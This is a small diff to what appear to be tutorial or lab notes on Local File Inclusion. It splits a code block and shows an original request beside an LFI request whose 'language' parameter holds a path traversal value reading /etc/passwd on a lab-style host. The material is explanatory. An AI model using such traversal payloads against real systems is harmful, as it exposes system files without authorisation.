@@ -17,7 +17,9 @@ In the most basic of cases, the attacker may simply change the value of the GET 
 ```bash
 # Original request
 http://94.237.49.23:48568/index.php?language=en.php
+```
 
+```bash
 # LFI
 http://94.237.49.23:48568/index.php?language=../../../../etc/passwd
 ```
